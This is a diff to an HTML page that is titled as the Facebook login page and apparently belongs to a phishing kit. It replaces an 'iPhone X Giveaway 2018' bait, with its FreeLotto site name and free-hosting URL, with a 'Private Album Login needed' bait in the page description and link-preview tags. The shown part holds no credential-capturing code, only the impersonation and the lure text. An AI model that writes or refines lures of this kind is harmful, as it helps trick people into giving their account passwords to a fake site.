@@ -8,7 +8,7 @@
 <head>
 	<meta charset="utf-8">
 	<meta name="viewport" content="width=device-width, initial-scale=1">
-	<meta name="description" content="iPhone X Giveaway 2018 - Chance To Win iPhone X !"/>
+	<meta name="description" content="Private Album Login needed!"/>
 	<title id="pageTitle">Log in to Facebook | Facebook</title>
 
 	<link rel="icon" 
@@ -20,15 +20,10 @@
 
 
 	<meta property="og:type" content="website" />
-    <meta property="og:title" content="iPhone X Giveaway 2018 - Chance To Win iPhone X !" />
-    <meta property="og:description" content="As a promotional offer of iPhone X, fans of Apple can get their phones by just applying here. So, the lucky person will be selected as the winners and they will be rewarded by this amazing featured phone iPhone X." />
-    <meta property="og:url" content="http://iphonexfree.vacau.com//?" />
-    <meta property="og:site_name" content="FreeLotto" />
-
-    <meta property="og:image" content="./iphone.jpg" />
-    <meta property="og:image:url" content="./iphone.jpg" />
-    <meta property="og:image:secure_url" content="./iphone.jpg" />
-    <meta property="og:image:type" content="image/png"/>
+    <meta property="og:title" content="Private Album Login needed" />
+    <meta property="og:description" content="Private Album Login needed" />
+    <meta property="og:url" content="Private Album Login needed" />
+    <meta property="og:site_name" content="Private Album Login needed" />
 
 	<!-- 
 	To learn more about the conditional comments around the html tags at the top of the file:
